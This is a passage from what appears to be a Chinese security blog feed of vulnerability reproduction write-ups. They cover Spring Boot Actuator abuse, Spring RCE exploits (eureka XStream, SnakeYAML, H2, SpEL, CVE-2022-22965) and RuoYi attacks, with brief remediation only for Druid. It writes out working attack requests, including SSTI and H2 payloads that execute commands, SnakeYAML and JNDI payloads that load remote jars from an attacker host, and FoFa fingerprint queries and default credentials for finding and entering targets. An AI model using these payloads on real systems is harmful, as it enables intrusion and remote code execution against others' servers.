class="language-swift">                <span class="string">&quot;type&quot;</span>:<span class="string">&quot;regex&quot;</span>,</span></span><br><span class="line"><span class="language-swift">                <span class="string">&quot;pattern&quot;</span>:<span class="string">&quot;([<span class="subst">\\</span>s<span class="subst">\\</span>S]*)&quot;</span>,</span></span><br><span class="line"><span class="language-swift">                <span class="string">&quot;listDelimiter&quot;</span>:<span class="string">&quot;56616469-6de2-9da4-efb8-8f416e6e6965&quot;</span>,</span></span><br><span class="line"><span class="language-swift">                <span class="string">&quot;columns&quot;</span>:[</span></span><br><span class="line"><span class="language-swift">                    <span class="string">&quot;raw&quot;</span></span></span><br><span class="line"><span class="language-swift">                ]</span></span><br><span class="line"><span class="language-swift">            &#125;</span></span><br><span class="line"><span class="language-swift">        &#125;,</span></span><br><span class="line"><span class="language-swift">        <span class="string">&quot;dataSchema&quot;</span>:&#123;</span></span><br><span class="line"><span class="language-swift">            <span class="string">&quot;dataSource&quot;</span>:<span class="string">&quot;sample&quot;</span>,</span></span><br><span class="line"><span class="language-swift">            <span class="string">&quot;timestampSpec&quot;</span>:&#123;</span></span><br><span class="line"><span class="language-swift">                <span class="string">&quot;column&quot;</span>:<span class="string">&quot;!!!_no_such_column_!!!&quot;</span>,</span></span><br><span class="line"><span class="language-swift">                <span class="string">&quot;missingValue&quot;</span>:<span class="string">&quot;1970-01-01T00:00:00Z&quot;</span></span></span><br><span class="line"><span class="language-swift">            &#125;,</span></span><br><span class="line"><span class="language-swift">            <span class="string">&quot;dimensionsSpec&quot;</span>:&#123;</span></span><br><span class="line"><span class="language-swift"></span></span><br><span class="line"><span class="language-swift">            &#125;,</span></span><br><span class="line"><span class="language-swift">            <span class="string">&quot;granularitySpec&quot;</span>:&#123;</span></span><br><span class="line"><span class="language-swift">                <span class="string">&quot;rollup&quot;</span>:<span class="literal">false</span></span></span><br><span class="line"><span class="language-swift">            &#125;</span></span><br><span class="line"><span class="language-swift">        &#125;,</span></span><br><span class="line"><span class="language-swift">        <span class="string">&quot;tuningConfig&quot;</span>:&#123;</span></span><br><span class="line"><span class="language-swift">            <span class="string">&quot;type&quot;</span>:<span class="string">&quot;kafka&quot;</span></span></span><br><span class="line"><span class="language-swift">        &#125;</span></span><br><span class="line"><span class="language-swift">    &#125;,</span></span><br><span class="line"><span class="language-swift">    <span class="string">&quot;samplerConfig&quot;</span>:&#123;</span></span><br><span class="line"><span class="language-swift">        <span class="string">&quot;numRows&quot;</span>:<span class="number">500</span>,</span></span><br><span class="line"><span class="language-swift">        <span class="string">&quot;timeoutMs&quot;</span>:<span class="number">15000</span></span></span><br><span class="line"><span class="language-swift">    &#125;</span></span><br><span class="line"><span class="language-swift">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230624155828710.png" alt="image-20230624155828710"></p><p><img src="/../images/image-20230624155800506.png" alt="image-20230624155800506"></p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ul><li><p>为Apache Druid 开启认证配置。</p><p><a href="https://druid.apache.org/docs/latest/development/extensions-core/druid-basic-security.html">https://druid.apache.org/docs/latest/development/extensions-core/druid-basic-security.html</a></p></li><li><p>升级版本</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Spring框架漏洞</title>
      <link href="/2023/06/22/spring%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2023/06/22/spring%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="Spring概述"><a href="#Spring概述" class="headerlink" title="Spring概述"></a>Spring概述</h2><p>Spring Framework 是一个开源的应用程序框架和 Java 平台的控制容器的反转。由于其强大的功能和易用性，它在行业中被各种程序和系统广泛使用。一些知名产品如 Spring Boot 和 Spring Cloud 都是使用 Spring Framework 开发的。</p><h2 id="框架特征"><a href="#框架特征" class="headerlink" title="框架特征"></a>框架特征</h2><ul><li><p>如果 Web 应用程序的 favicon.ico 图标默认没有更改，是一个小绿叶<br><img src="/../images/image-20230622113805635.png" alt="image-20230622113805635"></p><p>FoFa语法</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">icon_hash=&quot;116323821&quot;</span><br></pre></td></tr></table></figure></li><li><p>如果 web 应用开发者没有修改 SpringBoot Web 应用的默认 4xx、5xx 报错页面，那么当 web 应用程序出现 4xx、5xx 错误时，会报错如下图：</p><p><img src="/../images/image-20230622113724212.png" alt="image-20230622113724212"></p><p>FoFa语法</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">body=&quot;Whitelabel Error Page&quot;</span><br></pre></td></tr></table></figure></li></ul><h2 id="Spring-Boot-Actuator未授权访问"><a href="#Spring-Boot-Actuator未授权访问" class="headerlink" title="Spring Boot Actuator未授权访问"></a>Spring Boot Actuator未授权访问</h2><h3 id="Actuator概述"><a href="#Actuator概述" class="headerlink" title="Actuator概述"></a>Actuator概述</h3><p>​Actuator 是 springboot 提供的用来对应用系统进行自省和监控的功能模块，借助于 Actuator 开发者可以很方便地对应用系统某些监控指标进行查看、统计等。在 Actuator 启用的情况下，如果没有做好相关权限控制，非法用户可通过访问默认的执行器端点（endpoints）来获取应用系统中的监控信息，从而导致信息泄露甚至服务器被接管的事件发生。</p><p>​其提供的执行器端点分为两类：原生端点和用户自定义扩展端点，原生端点主要有：</p><p><img src="/../images/v2-2b1d2a3a0ce2ec85a29c4c2fcc81459c.jpg" alt="v2-2b1d2a3a0ce2ec85a29c4c2fcc81459c.jpg"></p><h4 id="版本问题"><a href="#版本问题" class="headerlink" title="版本问题"></a>版本问题</h4><ul><li><p><code>Spring Boot</code> &lt; 1.5：默认未授权访问所有端点、</p></li><li><p><code>Spring Boot</code> &gt;&#x3D; 1.5：默认只允许访问 <code>/health</code> 和 <code>/info</code> 端点，但是此安全性通常被应用程序开发人员禁用了</p></li><li><p><code>Spring Boot</code>2.x相比于1.x版本的端点多了个前缀 <code>/actuator</code>，如<code>/health</code> 变成了<code>/actuator/health</code>。</p></li></ul><h4 id="端点路径"><a href="#端点路径" class="headerlink" title="端点路径"></a>端点路径</h4><p>设置管理端点的路径:</p><p>在1.x版本下，设置语句如下:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">management.context-path =/manage</span><br></pre></td></tr></table></figure><p>此时端点的访问方式就变为了:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/manage/dump</span><br><span class="line">/manage/autoconfig</span><br><span class="line">/manage/metrics</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>在2.x版本，设置语句如下:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">management.endpoints.web.base-path=/manage</span><br></pre></td></tr></table></figure><p>此时端点的访问方式就变为了:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># /actuator被manage代替</span><br><span class="line"></span><br><span class="line">/manage/dump</span><br><span class="line">/manage/autoconfig</span><br><span class="line">/manage/metrics</span><br><span class="line">...</span><br></pre></td></tr></table></figure><blockquote><p>有些人可能喜欢将其命名为<code>monitor</code>,所以知道这个特点，我们可以适当丰富下自己的字典。</p></blockquote><h3 id="Actuator端点利用"><a href="#Actuator端点利用" class="headerlink" title="Actuator端点利用"></a>Actuator端点利用</h3><h4 id="x2F-mappings"><a href="#x2F-mappings" class="headerlink" title="&#x2F;mappings"></a>&#x2F;mappings</h4><p>泄露路由信息</p><p><img src="/../images/image-20230623215633942.png" alt="image-20230623215633942"></p><h4 id="x2F-trace，-x2F-httptrace"><a href="#x2F-trace，-x2F-httptrace" class="headerlink" title="&#x2F;trace，&#x2F;httptrace"></a>&#x2F;trace，&#x2F;httptrace</h4><ul><li><p>获取基本的 HTTP 请求跟踪信息（时间戳、HTTP 头等）</p></li><li><p>存在的隐患：如果存在登录用户的操作请求，可以窃取用户凭证。</p></li></ul><p><img src="/../images/image-20230623215702605.png" alt="image-20230623215702605"></p><p><strong>注意：这个只是显示最近的100条数据，但是我们可以写脚本来持续监控。</strong></p><h4 id="x2F-env"><a href="#x2F-env" class="headerlink" title="&#x2F;env"></a>&#x2F;env</h4><ul><li><p>获取全部环境属性</p></li><li><p>存在的隐患</p><ul><li><p>可能会泄露数据库账号密码等敏感信息,但是泄露的密码会用星号进行脱敏，想要获取相应的明文密码，可以尝试通过分析heapdump数据的方式</p></li><li><p>Spring eureka xstream  RCE</p></li></ul></li></ul><h4 id="x2F-heapdump"><a href="#x2F-heapdump" class="headerlink" title="&#x2F;heapdump"></a>&#x2F;heapdump</h4><blockquote><p>Heap Dump也叫堆转储文件，是一个Java进程在某个时间点上的内存快照<br>Heap Dump是有着多种类型的，不过总体上heap dump在触发快照的时候都保存了java对象和类的信息<br>通常在写heap dump文件前会触发一次FullGC，所以heap dump文件中保存的是FullGC后留下的对象信息。其中可能会含有敏感数据，如数据库的密码明文,accesskey等</p></blockquote><p>访问后会下载heapdump</p><p><img src="/../images/image-20230623215844567.png" alt="image-20230623215844567"></p><h5 id="heapdump分析工具"><a href="#heapdump分析工具" class="headerlink" title="heapdump分析工具"></a>heapdump分析工具</h5><ul><li><p><a href="https://github.com/wyzxxz/heapdump_tool">wyzxxz&#x2F;heapdump_tool: heapdump敏感信息查询工具，例如查找 spring heapdump中的密码明文，AK,SK等</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">基于JAVA自带的jhat，通过jhat解析heapdump文件</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230711221037329.png" alt="image-20230711221037329"></p></li><li><p><a href="https://github.com/whwlsfb/JDumpSpider">JDumpSpider</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -jar .\JDumpSpider-1.1-SNAPSHOT-full.jar .\heapdump</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230622152614844.png" alt="image-20230622152614844"></p><p><img src="/../images/image-20230622152600035.png" alt="image-20230622152600035"></p></li></ul><h2 id="Spring-eureka-xstream-RCE"><a href="#Spring-eureka-xstream-RCE" class="headerlink" title="Spring eureka xstream  RCE"></a><strong>Spring eureka xstream  RCE</strong></h2><h5 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h5><ul><li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li><li>可以 POST 请求目标网站的 <code>/refresh</code> 接口刷新配置（存在 <code>spring-boot-starter-actuator</code> 依赖）</li><li>目标使用的 <code>eureka-client</code> &lt; 1.8.7（通常包含在 <code>spring-cloud-starter-netflix-eureka-client</code> 依赖中）</li><li>目标可以请求攻击者的 HTTP 服务器（请求可出外网）</li></ul><p><img src="/../images/image-20230711220504085.png" alt="image-20230711220504085"></p><h5 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h5><p>修改要执行的命令后</p><p><img src="/../images/image-20230623213306180.png" alt="image-20230623213306180"></p><p>起一个恶意eureka server </p><p><img src="/../images/image-20230623213230483.png" alt="image-20230623213230483"></p><p>设置eureka.client.serviceUrl.defaultZone 属性为恶意的外部 eureka server URL 地址</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"># spring 1.x</span><br><span class="line">POST /env</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">eureka.client.serviceUrl.defaultZone=http://your-vps-ip/example</span><br><span class="line"></span><br><span class="line"># spring 2.x</span><br><span class="line">POST /actuator/env</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line">    </span><br><span class="line">&#123;&quot;name&quot;:&quot;eureka.client.serviceUrl.defaultZone&quot;,&quot;value&quot;:&quot;http://your-vps-ip/example&quot;&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230623213048736.png" alt="image-20230623213048736"></p><p> refresh 触发目标机器请求远程 URL，提前架设的  eureka server 就会返回恶意的 payload</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"># spring 1.x</span><br><span class="line"></span><br><span class="line">POST /refresh</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded  </span><br><span class="line"></span><br><span class="line"># spring 2.x</span><br><span class="line">POST /actuator/refresh</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230623212943456.png" alt="image-20230623212943456"></p><p>从而触发 XStream 反序列化，造成 RCE 漏洞</p><p><img src="/../images/image-20230623212922680.png" alt="image-20230623212922680"></p><p>执行完命令后记得恢复，如果不恢复的话，那么命令就会一直执行，系统也会一直报错，将eureka.client.serviceUrl.defaultZone属性设置为原来的即可。</p><p>​    </p><h2 id="Spring-cloud-SnakeYAML-RCE"><a href="#Spring-cloud-SnakeYAML-RCE" class="headerlink" title="Spring cloud SnakeYAML RCE"></a>Spring cloud SnakeYAML RCE</h2><h3 id="版本影响"><a href="#版本影响" class="headerlink" title="版本影响"></a>版本影响</h3><p>目标依赖的 <code>spring-cloud-starter</code> 版本 &lt; 1.3.0</p><h3 id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a>复现</h3><p>本地生成yaml-payload的jar包,命令为</p><p><img src="/../images/image-20230623221559474.png" alt="image-20230623221559474"></p><p>生成利用该jar包的example.yml文件</p><p><img src="/../images/image-20230623221123809.png" alt="image-20230623221123809"></p><p>挂载服务</p><p><img src="/../images/image-20230623221249623.png" alt="image-20230623221249623"></p><p>设置spring.cloud.bootstrap.location 属性为外部恶意 yml 文件 URL 地址</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># spring 1.x</span></span><br><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">eureka.client.serviceUrl.defaultZone=http:<span class="comment">//your-vps-ip/example.yml</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># spring 2.x</span></span><br><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;eureka.client.serviceUrl.defaultZone&quot;</span>,<span class="string">&quot;value&quot;</span>:<span class="string">&quot;http://your-vps-ip/example.yml&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230623220715323.png" alt="image-20230623220715323"></p><p>refresh 触发目标机器请求远程 HTTP 服务器上的 yml 文件，获得其内容</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># spring 1.x</span></span><br><span class="line"></span><br><span class="line">POST /refresh</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># spring 2.x</span></span><br><span class="line"></span><br><span class="line">POST /actuator/refresh</span><br><span class="line">Content-Type: application/json</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230623220901991.png" alt="image-20230623220901991"></p><p>SnakeYAML 由于存在反序列化漏洞，所以解析恶意 yml 内容时会完成指定的动作,先是触发 java.net.URL 去拉取远程 HTTP 服务器上的恶意 jar 文件,然后是寻找 jar 文件中实现 javax.script.ScriptEngineFactory 接口的类并实例化,实例化类时执行恶意代码，造成 RCE 漏洞</p><p><img src="/../images/image-20230623220853189.png" alt="image-20230623220853189"></p><h3 id="注入内存马"><a href="#注入内存马" class="headerlink" title="注入内存马"></a>注入内存马</h3><p><img src="/../images/image-20230623222557267.png" alt="image-20230623222557267"></p><h2 id="Spring-restart-h2-database-query-RCE"><a href="#Spring-restart-h2-database-query-RCE" class="headerlink" title="Spring restart h2 database query RCE"></a>Spring restart h2 database query RCE</h2><h3 id="版本影响-1"><a href="#版本影响-1" class="headerlink" title="版本影响"></a>版本影响</h3><p>存在 <code>com.h2database.h2</code> 依赖（版本要求暂未知）</p><h3 id="复现-2"><a href="#复现-2" class="headerlink" title="复现"></a>复现</h3><p>hackbar需要将原本的content-type删除，然后选择application&#x2F;json才可以发送Content-Type: application&#x2F;json的请求</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;spring.datasource.hikari.connection-test-query&quot;</span>,<span class="string">&quot;value&quot;</span>:<span class="string">&quot;CREATE ALIAS T5 AS CONCAT(&#x27;void ex(String m1,String m2,String m3)throws Exception&#123;Runti&#x27;,&#x27;me.getRun&#x27;,&#x27;time().exe&#x27;,&#x27;c(new String[]&#123;m1,m2,m3&#125;);&#125;&#x27;);CALL T5(&#x27;cmd&#x27;,&#x27;/c&#x27;,&#x27;calc&#x27;);&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230623233147055.png" alt="image-20230623233147055"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">POST /actuator/restart</span><br><span class="line">Content-Type: application/json</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230623233543854.png" alt="image-20230623233543854"></p><p><img src="/../images/image-20230623233529452.png" alt="image-20230623233529452"></p><p>需要注意的是payload 中的 ‘T5’ 方法每一次执行命令后都需要更换名称 (如 T6) ，然后才能被重新创建使用，否则下次 restart 重启应用时漏洞不会被触发</p><p><img src="/../images/image-20230623233701077.png" alt="image-20230623233701077"></p><h2 id="Spring-Cloud-Gateway-SPEL-RCE"><a href="#Spring-Cloud-Gateway-SPEL-RCE" class="headerlink" title="Spring Cloud Gateway SPEL RCE"></a>Spring Cloud Gateway SPEL RCE</h2><p>Spring Cloud Gateway是Spring中的一个API网关。存在SpEL表达式注入漏洞，<strong>当攻击者可以访问Actuator API的情况下</strong>，将可以利用该漏洞执行任意命令。</p><h3 id="版本影响-2"><a href="#版本影响-2" class="headerlink" title="版本影响"></a>版本影响</h3><ul><li>Spring Cloud Gateway<ul><li>3.1.0</li><li>3.0.0 to 3.0.6</li><li>Older, unsupported versions are also affected</li></ul></li></ul><h3 id="复现-3"><a href="#复现-3" class="headerlink" title="复现"></a>复现</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">添加一个包含恶意SpEL表达式的路由/actuator/gateway/routes/hacktest</span><br><span class="line">应用刚添加的路由/actuator/gateway/refresh</span><br><span class="line">访问恶意路由得到结果/actuator/gateway/routes/hacktest</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230622121048903.png" alt="image-20230622121048903"></p><p><img src="/../images/image-20230622121110774.png" alt="image-20230622121110774"></p><h2 id="Cloud-Function-SPEL-RCE"><a href="#Cloud-Function-SPEL-RCE" class="headerlink" title="Cloud Function  SPEL RCE"></a>Cloud Function  SPEL RCE</h2><p>Spring Cloud Function 是Spring cloud中的serverless框架。</p><p>Spring Cloud Function 中的 RoutingFunction 类的 apply 方法将请求头中的“spring.cloud.function.routing-expression”参数作为 Spel 表达式进行处理，造成 Spel 表达式注入漏洞。</p><p>攻击者可通过该漏洞执行任意代码。</p><h3 id="版本影响-3"><a href="#版本影响-3" class="headerlink" title="版本影响"></a>版本影响</h3><p>org.springframework.cloud:spring-cloud-function-context（影响版本：3.0.0.RELEASE~3.2.2）</p><h3 id="复现-4"><a href="#复现-4" class="headerlink" title="复现"></a>复现</h3><p>accept需要修改</p><p><img src="/../images/image-20230622130314936.png"></p><p><img src="/../images/image-20230622130328296.png" alt="image-20230622130328296"></p><h2 id="spring-core-rce"><a href="#spring-core-rce" class="headerlink" title="spring-core-rce"></a>spring-core-rce</h2><h3 id="版本影响-4"><a href="#版本影响-4" class="headerlink" title="版本影响"></a>版本影响</h3><p>使用JDK9及以上版本的Spring MVC框架<br>spring-webmvc 或 spring-webflux依赖<br>spring framework 5.3.0-5.3.17、5.2.0-5.2.19版本，以及更早的版本</p><h3 id="复现-5"><a href="#复现-5" class="headerlink" title="复现"></a>复现</h3><p>这里环境用vulfocus的，vulhub的不知道为啥不行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull vulfocus/spring-core-rce-2022-03-29</span><br><span class="line">docker run -d -p 8090:8080 --name springrce -it vulfocus/spring-core-rce-2022-03-29</span><br></pre></td></tr></table></figure><p>攻击原理</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">通过修改Tomcat的日志路径与后缀写入jsp木马</span><br></pre></td></tr></table></figure><p>脚本：<a href="https://github.com/Axx8/SpringFramework_CVE-2022-22965_RCE">https://github.com/Axx8/SpringFramework_CVE-2022-22965_RCE</a></p><p><img src="/../images/image-20230622144319219.png" alt="image-20230622144319219"></p><p><img src="/../images/image-20230622144248672.png" alt="image-20230622144248672"></p><p><img src="/../images/image-20230622143115129.png" alt="image-20230622143115129"></p><p>需要注意的是每次向webhsell请求时都会再次向其写入木马内容</p><p><img src="/../images/image-20230622143518694.png" alt="image-20230622143518694"></p><p>可以通过以下请求进行清除</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">/?class.module.classLoader.resources.context.parent.pipeline.first.pattern=</span><br></pre></td></tr></table></figure><p>总体来说，这个漏洞的利用方法会修改目标服务器配置，导致目标需要重启服务器才能恢复，实际测试中需要格外注意。</p><h2 id="权限绕过"><a href="#权限绕过" class="headerlink" title="权限绕过"></a>权限绕过</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/admin/%0a</span><br><span class="line">/admin/%0d</span><br><span class="line"></span><br><span class="line"># CVE-2023-20860</span><br><span class="line">/admin/** </span><br></pre></td></tr></table></figure><h3 id="复现-6"><a href="#复现-6" class="headerlink" title="复现"></a>复现</h3><p><img src="/../images/image-20230622145009253.png" alt="image-20230622145009253"></p><p><img src="/../images/image-20230622145034999.png" alt="image-20230622145034999"></p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://github.com/LandGrey/SpringBootVulExploit#%E4%B8%80%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2">LandGrey&#x2F;SpringBootVulExploit: SpringBoot 相关漏洞学习资料，利用方法和技巧合集，黑盒安全评估 check list</a></p><p><a href="https://xz.aliyun.com/t/9763">https://xz.aliyun.com/t/9763</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SpringBoot代审--项目结构</title>
      <link href="/2023/06/22/SpringBoot%E4%BB%A3%E5%AE%A1--%E9%A1%B9%E7%9B%AE%E7%BB%93%E6%9E%84/"/>
      <url>/2023/06/22/SpringBoot%E4%BB%A3%E5%AE%A1--%E9%A1%B9%E7%9B%AE%E7%BB%93%E6%9E%84/</url>
      
        <content type="html"><![CDATA[<h1 id="Spring-Boot项目结构"><a href="#Spring-Boot项目结构" class="headerlink" title="Spring Boot项目结构"></a>Spring Boot项目结构</h1><p>SpringBoot</p>]]></content>
      
      
      <categories>
          
          <category> JAVA </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>若依漏洞</title>
      <link href="/2023/06/21/%E8%8B%A5%E4%BE%9D%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2023/06/21/%E8%8B%A5%E4%BE%9D%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="RuoYi介绍"><a href="#RuoYi介绍" class="headerlink" title="RuoYi介绍"></a>RuoYi介绍</h2><p><a href="http://ruoyi.vip/">http://ruoyi.vip/</a></p><p>基于<strong>SpringBoot</strong>的权限管理系统 易读易懂、界面简洁美观。 核心技术采用<strong>Spring、MyBatis、Shiro</strong>没有任何其它重度依赖。</p><blockquote><p>若依的作者将Spring Security替换为shiro</p></blockquote><h2 id="RuoYi漏洞概览"><a href="#RuoYi漏洞概览" class="headerlink" title="RuoYi漏洞概览"></a>RuoYi漏洞概览</h2><p>官方对历史漏洞进行了相关整理：<a href="https://doc.ruoyi.vip/ruoyi/document/kslj.html#%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E">https://doc.ruoyi.vip/ruoyi/document/kslj.html#%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E</a></p><table><thead><tr><th>漏洞名称</th><th>访问路径</th><th>版本</th></tr></thead><tbody><tr><td>Thymeleaf SSTI</td><td><code>/monitor/cache/getNames</code></td><td>&lt;&#x3D; v4.7.1</td></tr><tr><td>定时计划反射RCE</td><td><code>系统监控—&gt;定时任务—&gt;添加任务-&gt;调用目标字符串</code></td><td>&lt;&#x3D; v4.6.2</td></tr><tr><td>SQL注入</td><td><code>/system/role/list</code>、<code>/system/dept/edit</code></td><td>&lt;&#x3D; 4.6.1</td></tr><tr><td>任意文件下载</td><td><code>/common/download/resource</code></td><td>&lt;&#x3D; v4.5.0</td></tr><tr><td>Fastjson RCE</td><td><code>/tool/gen/edit</code></td><td>&lt;&#x3D; v4.2.0</td></tr></tbody></table><p>默认口令：admin&#x2F;admin123</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ul><li><p>hunter</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">web.body=&quot;/ruoyi/css/ry-ui.css?v=版本号&quot;</span><br></pre></td></tr></table></figure></li><li><p>本地搭建</p><p>下载：<a href="https://gitee.com/y_project/RuoYi">https://gitee.com/y_project/RuoYi</a></p><p>IDEA连接数据库</p><p><img src="/../images/image-20230621190329600.png" alt="image-20230621190329600"></p><p>剩下步骤</p><p>修改配置文件<code>RuoYi-Vue/ruoyi-admin/src/main/resources/logback.xml</code>中的数据库账号和密码</p><p><a href="https://juejin.cn/post/7081625556705345573">RuoYi搭建开发环境 - 掘金</a></p></li></ul><h2 id="Thymeleaf-SSTI"><a href="#Thymeleaf-SSTI" class="headerlink" title="Thymeleaf SSTI"></a>Thymeleaf SSTI</h2><p>本质上还是SPEL表达式注入<a href="https://xz.aliyun.com/t/10514#toc-9">Thymeleaf SSTI漏洞分析 - 先知社区 (aliyun.com)</a></p><h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/monitor/cache/getNames</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">fragment</span>=__<span class="variable">$&#123;T<span class="number">%20</span>(java.lang.Runtime).getRuntime().exec(&#x27;curl<span class="number">%20</span>cn0165.dnslog.cn&#x27;)&#125;</span>__::.x</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230825151844044.png" alt="image-20230825151844044"></p><p><img src="/../images/image-20230825151819003.png" alt="image-20230825151819003"></p><h3 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h3><p><a href="https://xz.aliyun.com/t/11509#toc-3">记一次实战之若依SSTI注入绕过玄某盾 - 先知社区</a></p><h2 id="后台定时任务–YAML反序列化"><a href="#后台定时任务–YAML反序列化" class="headerlink" title="后台定时任务–YAML反序列化"></a>后台定时任务–YAML反序列化</h2><p><a href="https://www.cnblogs.com/nice0e3/p/14514882.html">Java安全之SnakeYaml反序列化分析 - nice_0e3 - 博客园 (cnblogs.com)</a></p><h3 id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a>复现</h3><p>默认密码为admin&#x2F;admin123</p><p>进入后台系统监控下的定时任务功能，可以发现调用目标字符串的字段。</p><p><img src="/../images/image-20230621192434476.png" alt="image-20230621192434476"></p><h4 id="生成yaml恶意jar包"><a href="#生成yaml恶意jar包" class="headerlink" title="生成yaml恶意jar包"></a>生成yaml恶意jar包</h4><p><a href="https://github.com/artsploit/yaml-payload">https://github.com/artsploit/yaml-payload</a></p><p>修改项目源码文件 src&#x2F;artsploit&#x2F;AwesomeScriptEngineFactory.java </p><p><img src="/../images/image-20230621210916844.png" alt="image-20230621210916844"></p><p>在idea中打开终端</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">打包为jar包</span></span><br><span class="line">javac src/artsploit/AwesomeScriptEngineFactory.java</span><br><span class="line">jar -cvf yaml-payload.jar -C src/ .</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">开启http服务</span></span><br><span class="line">python -m http.server 1234</span><br></pre></td></tr></table></figure><h4 id="创建并开启定时任务"><a href="#创建并开启定时任务" class="headerlink" title="创建并开启定时任务"></a>创建并开启定时任务</h4><p><img src="/../images/image-20230825143833628.png" alt="image-20230825143833628"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">org.yaml.snakeyaml.Yaml.load(<span class="string">&#x27;!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [&quot;http://ip:port/yaml-payload.jar&quot;]]]]&#x27;</span>)</span><br><span class="line"></span><br><span class="line">org.springframework.jndi.JndiLocatorDelegate.lookup(<span class="string">&#x27;rmi://ip:port/Evil&#x27;</span>)</span><br><span class="line"></span><br><span class="line">javax.naming.InitialContext.lookup(<span class="string">&#x27;ldap://ip:port/#Evil&#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h4><p><img src="/../images/image-20230621210823778.png" alt="image-20230621210823778"></p><p><img src="/../images/image-20230621210844522.png" alt="image-20230621210844522"></p><h3 id="绕过姿势-1"><a href="#绕过姿势-1" class="headerlink" title="绕过姿势"></a>绕过姿势</h3><p><a href="https://xz.aliyun.com/t/10957#toc-0">某依rce黑名单多种bypass方法分析 - 先知社区</a></p><p><a href="https://xz.aliyun.com/t/11336#toc-0">定时任务功能点绕过黑白名单执行任意sql语句 - 先知社区</a></p><h2 